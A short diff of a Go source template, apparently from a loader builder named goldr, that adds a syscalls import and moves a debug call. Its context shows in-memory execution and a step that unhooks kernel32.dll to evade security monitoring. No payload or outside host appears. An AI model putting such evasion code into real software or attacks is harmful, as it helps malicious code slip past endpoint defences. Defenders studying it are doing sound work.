@@ -13,12 +13,10 @@ import (
 	"os/exec"
 	//{{end}}
 
-	//{{if .Reflect}}
-	// WIP
-	//{{end}}
-
 	"github.com/amenzhinsky/go-memexec"
 	//{{end}}
+
+	"github.com/coremedic/goldr/pkg/syscalls"
 
 	//{{if .Unhook}}
 	"github.com/coremedic/goldr/pkg/evasion"
@@ -33,6 +31,9 @@ var (
 )
 
 func main() {
+	//{{if .Debug}}
+	syscalls.Debug()
+	//{{end}}
 	//{{if .Unhook}}
 	err := evasion.UnHookDll(`c:\windows\system32\kernel32.dll`)
 	if err != nil {
@@ -55,9 +56,6 @@ func main() {
 		//{{end}}
 		return
 	}
-	//{{if .Debug}}
-	evasion.Debug()
-	//{{end}}
 	//{{end}}
 
 	//{{if .Spawn}}
